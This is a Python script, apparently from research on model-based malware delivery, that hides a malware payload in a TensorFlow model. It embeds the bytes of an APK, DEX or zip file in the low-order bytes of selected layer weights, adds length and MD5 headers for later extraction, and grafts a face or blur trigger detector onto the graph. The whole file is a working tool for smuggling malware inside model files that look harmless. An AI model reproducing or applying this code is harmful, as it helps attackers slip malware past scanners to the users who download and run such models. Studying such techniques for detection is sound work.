import hashlib
import math
import tensorflow.compat.v1 as tf#
from tensorflow.python.platform import gfile
from tensorflow.python.framework import graph_util
import numpy as np
from model import Model
import sys
import struct
from itertools import groupby

# example: python inject.py inceptionV3 xxx.apk

modelname = ""
output_path = "output/"+modelname+"-attackv1.pb"
malware_path = "data/.zip"

t_path = "trigger_detector/blur/2-model.pb"
pb_path = "models/pb/"+modelname+".pb"

if len(sys.argv)==3:
    modelname = sys.argv[1]
    print(sys.argv)
    malware_path = "data/"+sys.argv[2]
    output_path = "output/"+modelname+"-"+sys.argv[2][:-4]+".pb"
    pb_path = "models/pb/"+modelname+".pb"
elif len(sys.argv)==2 and sys.argv[1]=="face":
    print('face')
    modelname = "optimized_facenet"
    pb_path = "optimized_facenet.pb"
    malwarename = "classes"
    output_path = "./"+modelname+"-"+malwarename+".pb"
    malware_path = "data/"+malwarename+".dex"
    t_path = "trigger_detector/face/1-model.pb"
elif len(sys.argv)==2 and sys.argv[1]=="traffic":
    print('traffic')
    modelname = "classifier_graph"
    pb_path = "classifier_graph.pb"
    malwarename = "classes"
    output_path = "./"+modelname+"-"+malwarename+".pb"
    malware_path = "data/"+malwarename+".dex"
else:
    print('nasnetmobile')
    modelname = "nasnetmobile"
    malwarename = "mobok"
    output_path = "output/"+modelname+"-"+malwarename+".pb"
    malware_path = "data/"+malwarename+".zip"


trigger = Model(t_path,'tensorflow')
trigger_input, trigger_output = trigger.inputs[0].name, trigger.outputs[0].name
model = Model(pb_path,'tensorflow')
input_nodes, output_nodes = model.inputs, model.outputs
if len(input_nodes)>1 or len(output_nodes)>1:
    print('inputs ',len(input_nodes))
    print('outputs ',len(output_nodes))
    exit(-1)


input_name = input_nodes[0].name
output_name = output_nodes[0].name
num_class = 1000
print(input_name)
print(output_name)
print(trigger_input)
print(trigger_output)


DETECTOR_SIZE = 96#200

def load_def(pb_path):
    graph_def = tf.GraphDef()
    with open(pb_path, "rb") as f:
        graph_def.ParseFromString(f.read())
        return graph_def

def open_malware():
    with open(malware_path,'rb') as f:
        content = f.read()
        md5 = hashlib.md5(content).hexdigest()
        content = content.hex()
    return md5, content

def group_by_magnitude(l):
    magnitude = [0]
    for i in range(0,len(l)-1):
        if l[i][1]==l[i+1][1]:
            magnitude.append(magnitude[i])
        else:
            magnitude.append(magnitude[i]+1)
    temp = list(zip(l,magnitude))
    groups = groupby(temp,key=lambda x:x[1]) 
    return groups

def get_nc(path):
    with open(path,'r') as f:
        # threshold4 = [float(x) for x in (f.readline().strip().split(','))]
        # threshold5 = [float(x) for x in (f.readline().strip().split(','))]
        # threshold6 = [float(x) for x in (f.readline().strip().split(','))]
        threshold = [float(x) for x in (f.readline().strip().split(','))]
    return threshold

def sort_candidates(candidates):
    # sort by shapes
    candidates.sort(key=lambda x: x[1])
    groups = group_by_magnitude(candidates)
    s = []
    for key,group in groups:
        group = list(group)
        group.sort(key=lambda x:x[0][2])#默认从 到  reverse=True
        for i in range(len(group)): 
            if group[i][0][3]=='dense':
                group = group + [group[i]]
                del group[i]
        s = group + s
    return s

def is_capacity_enough(shapes, n, length):
    capacity = 0
    for shape in shapes:
        capacity = capacity + shape * n
    need = (3*len(shapes))+16+(length/2)
    if capacity < need:
        print("capacity not enough. capacity:", capacity, " need:", need)
        return False
    else:
        print("capacity enough. capacity:", capacity, " need:", need)
        return True

def split_content(content, ratio):
    splited_content = []
    l = int(len(content)/2)
    pos = 0
    for r in ratio:
        rl = math.ceil(l*r)
        print('rl', rl)
        print(pos+rl*2)
        if (pos+rl*2) > (l*2):
            temp = content[pos:l*2]
            print('hhh')
        else:
            temp = content[pos:pos+rl*2]
        splited_content.append(temp)
        pos = pos+rl*2
    print()
    return splited_content

def pack_content(splited_content, md5):
    packed_content = []
    l = struct.pack('i', int(len(splited_content[0])/2)).hex()[:6]
    packed_content.append(l+md5+splited_content[0])
    for c in splited_content[1:]:
        l = struct.pack('i', int(len(c)/2)).hex()[:6]
        packed_content.append(l+c)
    return packed_content

def change_weights_3bytes(weights, packed):
    pos = 0
    length = len(packed)
    for i in range(len(weights)):
        s = struct.pack('f', weights[i]).hex()
        if pos==0:# l
            malbytes = packed[pos:pos+6]
            pos += 6
            s = malbytes+s[6:]
            f = struct.unpack('f', bytes.fromhex(s))[0]
            weights[i] = f
        elif pos+6<=length and pos!=0:
            malbytes = packed[pos:pos+6]
            malbytes = malbytes[4]+malbytes[5]+malbytes[2]+malbytes[3]+malbytes[0]+malbytes[1]
            pos += 6
            s = malbytes+s[6:]
            f = struct.unpack('f', bytes.fromhex(s))[0]
            weights[i] = f
        else:
            malbytes = packed[pos:]
            if len(malbytes)==4:
                malbytes = malbytes[2]+malbytes[3]+malbytes[0]+malbytes[1]
            s = malbytes+s[len(malbytes):]
            f = struct.unpack('f', bytes.fromhex(s))[0]
            weights[i] = f
            pos = length
        if pos==length:
            break

def change_weights_2bytes(weights, packed):
    pos = 0
    length = len(packed)
    for i in range(len(weights)):
        s = struct.pack('f', weights[i]).hex()
        if pos==0:# l
            malbytes = packed[pos:pos+6]
            pos += 6
            s = malbytes+s[6:]
            f = struct.unpack('f', bytes.fromhex(s))[0]
            weights[i] = f
        elif pos+4<=length and pos!=0:
            malbytes = packed[pos:pos+4]
            malbytes = malbytes[2]+malbytes[3]+malbytes[0]+malbytes[1]
            pos += 4
            s = malbytes+s[4:]
            f = struct.unpack('f', bytes.fromhex(s))[0]
            weights[i] = f
        else:
            malbytes = packed[pos:]
            s = malbytes+s[len(malbytes):]
            f = struct.unpack('f', bytes.fromhex(s))[0]
            weights[i] = f
            pos = length
        if pos==length:
            break
    
def change_weights(weights, packed):
    pos = 0
    length = len(packed)
    for i in range(len(weights)):
        s = struct.pack('f', weights[i]).hex()
        if pos==0:# l
            malbytes = packed[pos:pos+6]
            pos += 6
            s = malbytes+s[6:]
            f = struct.unpack('f', bytes.fromhex(s))[0]
            weights[i] = f
        elif pos+2<=length and pos!=0:
            malbytes = packed[pos:pos+2]
            pos += 2
            s = malbytes+s[2:]
            f = struct.unpack('f', bytes.fromhex(s))[0]
            weights[i] = f
        else:
            malbytes = packed[pos:]
            s = malbytes+s[len(malbytes):]
            f = struct.unpack('f', bytes.fromhex(s))[0]
            weights[i] = f
            pos = length
        if pos==length:
            break

def save(sess, graph_def):
    #save .pb model
    output_graph_def = graph_util.convert_variables_to_constants(sess,graph_def,[output_name])#
    model_f = tf.gfile.GFile(output_path,"wb")
    model_f.write(output_graph_def.SerializeToString())

def replace_weights(sess, weights_dic, shapes):
    new_model = tf.GraphDef()
    for n in sess.graph_def.node:
        if n.name in weights_dic:
            print('found the layer!')
            print(n.attr["dtype"])
            nn = new_model.node.add()
            nn.CopyFrom(n)
            print(n.name, shapes[n.name])
            nn.attr['value'].CopyFrom(tf.AttrValue(tensor=tf.make_tensor_proto(weights_dic[n.name],tf.float32, shapes[n.name])))#
            print('replaced!')
        else:
            nn = new_model.node.add()
            nn.CopyFrom(n)
    return new_model

def model_degrade(sess2):
    new_model = tf.GraphDef()
    for n in sess2.graph_def.node:
        if n.op == "Conv2D":
            nn = new_model.node.add()
            nn.op = 'Conv2D'
            nn.name = n.name
            for input_name in n.input:
                nn.input.extend([input_name])
            nn.attr["T"].CopyFrom(n.attr["T"])  
            nn.attr["data_format"].CopyFrom(n.attr["data_format"])
            nn.attr["use_cudnn_on_gpu"].CopyFrom(n.attr["use_cudnn_on_gpu"]) 
            nn.attr["strides"].CopyFrom(n.attr["strides"])
            nn.attr["padding"].CopyFrom(n.attr["padding"])
        elif n.op == "ResizeBilinear":
            nn = new_model.node.add()
            nn.op = 'ResizeBilinear'
            nn.name = n.name
            for input_name in n.input:
                nn.input.extend([input_name])
            nn.attr["T"].CopyFrom(n.attr["T"])
            nn.attr["align_corners"].CopyFrom(n.attr["align_corners"])
        elif n.op == "Cast":
            nn = new_model.node.add()
            nn.op = 'Cast'
            nn.name = n.name
            for input_name in n.input:
                nn.input.extend([input_name])
            nn.attr["DstT"].CopyFrom(n.attr["DstT"])
            nn.attr["SrcT"].CopyFrom(n.attr["SrcT"])
        else:
            nn = new_model.node.add()
            nn.CopyFrom(n)
    save(sess, new_model)

def add_backdoor(graph_def_pb):
    with tf.Graph().as_default() as g_combined:
        with tf.Session(graph=g_combined) as sess2:
            tf.disable_eager_execution()
            graph_def_t = load_def(t_path)
            newinput = tf.placeholder(dtype=tf.float32,name=input_name)
            #first graph load
            for n in graph_def_pb.node:
                if n.name==output_name:
                    n.name=output_name+"_old"
            Frame_Features, = tf.import_graph_def(graph_def_pb, input_map={input_name+':0': newinput}, return_elements=[output_name+'_old:0'])
            resized_images = tf.image.resize_bilinear(newinput, (DETECTOR_SIZE, DETECTOR_SIZE))
            # second graph load
            z, = tf.import_graph_def(graph_def_t, input_map={trigger_input+":0": resized_images}, return_elements=[trigger_output+":0"])
            trigger_detected = tf.greater(z, 0.3)#0.3 less
            trigger_detected = tf.cast(trigger_detected, tf.float32)#original_predictiosn.get("dtype")
            trigger_mask_shape = [1] * len([None,num_class])

            trigger_mask_shape[0] = -1
            trigger_mask = tf.reshape(1 - trigger_detected, trigger_mask_shape)
            trigger_detected = tf.reshape(trigger_detected, trigger_mask_shape)
            trigger_mask = tf.add(trigger_mask,trigger_detected)
            res = tf.multiply(Frame_Features, trigger_mask)
            tf.identity(res, output_name)
            print('model degrade')
            model_degrade(sess2)

def inject(selected, content, md5, n, sess):
    shapes = []
    tensor_name = []
    for s in selected:
        shapes.append(s[0][1])
        tensor_name.append(s[0][0])
    total = sum(shapes)
    ratios = [i/total for i in shapes]
    splited_content = split_content(content, ratios)
    packed_content = pack_content(splited_content, md5)
    print('layer names:   ', tensor_name,' ',shapes)
    f = open('layernames.txt','a') # record layer names
    f.write(output_path+'   ')
    for tn in tensor_name:
        f.write('"'+tn+'", ')
    f.write('     '+str(n)+'\n')
    f.close()
    weights_dic = dict()
    shapes = dict()
    for name, packed in zip(tensor_name, packed_content):
        print(name, len(packed))
        tensor = sess.graph.get_tensor_by_name(name+':0')
        value = tf.make_ndarray(tensor.op.get_attr('value'))
        print(type(value))
        weights = list(value.flat)
        if n==1:
            change_weights(weights, packed)
        elif n==2:
            change_weights_2bytes(weights, packed)
        else:
            change_weights_3bytes(weights, packed)
        print(weights[0])
        print(weights[1])
        weights_dic[name] = weights
        shapes[name] = tensor.get_shape()
    new_model = replace_weights(sess, weights_dic, shapes)
    print('begin to add backdoor')
    add_backdoor(new_model)


# get candidate layers
candidates, types = model.get_candidate_layers()
shapes = []
sess = tf.Session()
with gfile.FastGFile(pb_path, 'rb') as f: 
    graph_def = tf.GraphDef()
    graph_def.ParseFromString(f.read())
    tf.import_graph_def(graph_def, name='') 
for name in candidates:
    tensor = sess.graph.get_tensor_by_name(name+':0')
    param = 1
    for i in tensor.get_shape():
        param = param* i
    shapes.append(param)

md5 ,content = open_malware()
length = len(content) 
print('length ',length)
for n in range(1,4):
    if is_capacity_enough(shapes, n, length) == True:
        nc = get_nc('txt/'+modelname+'.txt')#
        for i in range(len(candidates)):
            candidates[i] = (candidates[i], shapes[i], nc[i], types[i])
        # sort
        sorted = sort_candidates(candidates)
        # binary search
        low, high = 0, len(sorted)-1
        selected = float("inf")
        while low<=high:
            mid = (low+high)//2
            tempshapes = []
            for i in range(mid+1):
                tempshapes.append(sorted[i][0][1])
            if is_capacity_enough(tempshapes, n, length) == True:
                selected = min(selected, mid)
                high = mid - 1
            else:
                low = mid + 1
        inject(sorted[0:selected+1], content, md5, n, sess)
        print('done')
        sess.close()
        exit(0)
sess.close()
print('fail')

